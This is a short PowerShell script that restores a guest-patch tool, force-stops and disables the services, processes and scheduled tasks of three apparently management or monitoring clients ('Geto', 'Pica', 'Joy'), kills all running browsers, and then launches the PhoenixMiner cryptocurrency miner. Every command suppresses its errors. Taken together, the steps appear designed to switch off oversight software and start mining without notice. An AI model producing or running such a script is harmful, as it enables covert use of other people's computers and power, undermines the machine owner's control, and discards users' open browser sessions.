function Get-ScriptDirectory
{
	[OutputType([string])]
	param ()
	if ($null -ne $hostinvocation)
	{
		Split-Path $hostinvocation.MyCommand.path
	}
	else
	{
		Split-Path $script:MyInvocation.MyCommand.Path
	}
}

Start-Process -FilePath "forePatchGuest.exe" -WorkingDirectory "C:\forePatchGuest" -ArgumentList "restore" -Wait -ErrorAction SilentlyContinue
Start-Process -FilePath "forePatchGuest.exe" -WorkingDirectory "C:\forePatchGuest" -ErrorAction SilentlyContinue

# Close Geto
Disable-ScheduledTask -TaskName "WMCLTS" -ErrorAction SilentlyContinue
Stop-Process -Name WmClt -Force -ErrorAction SilentlyContinue
Stop-Process -Name WmCltSvc -Force -ErrorAction SilentlyContinue
Stop-Service -Name WMCLTSVC -Force -ErrorAction SilentlyContinue

# Close Pica
Stop-Process -Name pmclient -Force -ErrorAction SilentlyContinue
Stop-Process -Name pmLC -Force -ErrorAction SilentlyContinue
Stop-Service -Name pmsys -Force -ErrorAction SilentlyContinue

# Close Joy
Set-Service -Name JoyMachineService -StartupType Disabled  -ErrorAction SilentlyContinue
Stop-Service -Name JoyMachineService -Force -ErrorAction SilentlyContinue
Stop-Process -Name WindowsJoyMachineService -Force -ErrorAction SilentlyContinue
Disable-ScheduledTask -TaskName *joymachineW -ErrorAction SilentlyContinue
Disable-ScheduledTask -TaskName AdministratorjoymachineW -ErrorAction SilentlyContinue
Stop-Process -Name winCLI -Force -ErrorAction SilentlyContinue
Stop-Process -Name joyTools -Force -ErrorAction SilentlyContinue

Stop-Process -Name iexplore -Force -ErrorAction SilentlyContinue
Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
Stop-Process -Name MicrosoftEdge -Force -ErrorAction SilentlyContinue

$scriptDirectory = Get-ScriptDirectory
Start-Process -FilePath "start.bat" -WorkingDirectory $(Join-Path $scriptDirectory "PhoenixMiner_5.4c_Windows")
